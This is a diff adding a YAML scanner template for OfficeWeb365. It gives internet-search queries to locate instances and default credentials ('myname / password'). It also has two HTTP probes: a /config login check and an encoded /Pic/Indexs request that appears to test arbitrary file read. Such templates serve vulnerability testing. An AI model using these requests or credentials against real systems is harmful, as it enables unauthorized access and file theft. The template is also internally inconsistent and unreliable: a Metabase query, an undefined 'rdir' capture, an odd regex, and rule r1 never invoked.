@@ -1,0 +1,63 @@
+name: officeweb365-config-login
+detail:
+  author: 
+  links:
+    - 
+  vulnerability:
+    level: critical
+    fofa-query: "officeweb365"
+    hunter-query: app.name=="OfficeWeb365"
+    quake-query: app:"officeweb365"
+    zoomeye-query: app:"Metabase"
+    threatbook-query: 
+    cve: 
+    tips: 默认的账号/密码  myname / password
+
+transport: http
+set:
+    s1: randomInt(1000000000, 9000000000)
+    s2: randomLowercase(8)
+    s3: randomLowercase(8)
+    rboundary: randomInt(800000000, 1000000000)
+    reverse: newReverse()
+    reverseURL: reverse.url
+    t1: timeConvert(now(), '2006-01-02')
+    t2: timeConvert(now(), '2006-01')
+    b1: base64Decode("")
+    h1: hexDecode("")
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /config
+      follow_redirects: false
+      headers:
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
+        Accept-Encoding: gzip
+      body:
+      
+    expression: response.status == 200 && (response.body_string.contains("用户名") || response.body.bcontains(bytes("用户名")))
+
+    output:
+      search: |-
+        "(?P<rfile>\\w+.jsp)".bsubmatch(response.body)
+      rfile: search["rfile"]
+      search1: |-
+        '"date\":\"(?P<date>.+?)\",\"macaddr".bsubmatch(response.body)'
+      rdir: search["rdir"]
+
+  r1:
+    request:
+      method: GET
+      path: /Pic/Indexs?imgs=DJwkiEm6KXJZ7aEiGyN4Cz83Kn1PLaKA09
+      follow_redirects: false
+      headers:
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
+        Connection: close
+        Accept-Encoding: gzip
+      body:
+
+    expression: response.status == 200 && (response.body_string.contains("[fonts]") || response.body.bcontains(bytes("[fonts]")))
+    
+expression: r0() 
